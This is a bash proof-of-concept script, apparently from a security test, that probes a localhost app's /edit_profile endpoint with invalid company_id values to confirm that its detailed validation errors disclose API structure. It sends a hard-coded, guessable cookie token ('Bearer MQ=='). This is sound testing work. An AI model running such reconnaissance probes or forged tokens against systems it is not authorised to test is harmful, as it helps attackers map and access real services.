#!/bin/bash

# POC: Information Disclosure - Detailed Parameter Validation Error Messages
# This script demonstrates how the application returns detailed validation errors
# that reveal API structure and parameter types

TARGET="http://localhost:8080"
TOKEN="Bearer MQ=="

echo "[*] Testing Information Disclosure via Detailed Validation Error Messages"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Invalid company_id (non-numeric) in path parameter
echo "[TEST 1] Sending GET request with invalid (non-numeric) company_id"
echo "Request: GET /edit_profile/abc"
echo "Headers: Cookie: user_token=$TOKEN"
echo ""

RESPONSE=$(curl -s -X GET "$TARGET/edit_profile/abc" \
  -H "Cookie: user_token=$TOKEN" \
  -w "\nHTTP_STATUS:%{http_code}")

HTTP_STATUS=$(echo "$RESPONSE" | grep "HTTP_STATUS:" | cut -d':' -f2)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "Response Status: $HTTP_STATUS"
echo "Response Body:"
echo "$BODY" | python3 -m json.tool 2>/dev/null || echo "$BODY"
echo ""

# Check if response contains detailed error messages
if echo "$BODY" | grep -q "int_parsing\|Input should be a valid integer"; then
    echo "[!] VULNERABILITY CONFIRMED"
    echo "[!] The error message reveals:"
    echo "    - Parameter location: 'path'"
    echo "    - Parameter name: 'company_id'"
    echo "    - Expected type: 'integer'"
    echo "    - Actual input received: 'abc'"
    echo ""
    echo "[!] This information can help attackers:"
    echo "    1. Understand the API structure and parameter types"
    echo "    2. Identify valid endpoints and parameter locations"
    echo "    3. Map out the complete API"
    echo "    4. Reverse-engineer input validation requirements"
    echo ""
else
    echo "[-] Error message not found or application doesn't return detailed errors"
fi

# Test 2: Try other invalid inputs to see what details are exposed
echo "[TEST 2] Testing with another invalid parameter to see if pattern is consistent"
echo "Request: GET /edit_profile/xyz"
echo ""

RESPONSE2=$(curl -s -X GET "$TARGET/edit_profile/xyz" \
  -H "Cookie: user_token=$TOKEN" \
  -w "\nHTTP_STATUS:%{http_code}")

HTTP_STATUS2=$(echo "$RESPONSE2" | grep "HTTP_STATUS:" | cut -d':' -f2)
BODY2=$(echo "$RESPONSE2" | sed '$d')

echo "Response Status: $HTTP_STATUS2"
echo "Response Body:"
echo "$BODY2" | python3 -m json.tool 2>/dev/null || echo "$BODY2"
echo ""

# Test 3: Try with valid numeric ID to compare
echo "[TEST 3] Testing with valid numeric company_id for comparison"
echo "Request: GET /edit_profile/1"
echo ""

RESPONSE3=$(curl -s -X GET "$TARGET/edit_profile/1" \
  -H "Cookie: user_token=$TOKEN" \
  -w "\nHTTP_STATUS:%{http_code}")

HTTP_STATUS3=$(echo "$RESPONSE3" | grep "HTTP_STATUS:" | cut -d':' -f2)
BODY3=$(echo "$RESPONSE3" | sed '$d')

echo "Response Status: $HTTP_STATUS3"
echo "Response Body (truncated):"
echo "$BODY3" | python3 -m json.tool 2>/dev/null | head -20 || echo "$BODY3" | head -20
echo ""

echo "[*] POC Complete"
echo "[*] If TEST 1 shows 'VULNERABILITY CONFIRMED', the finding is valid"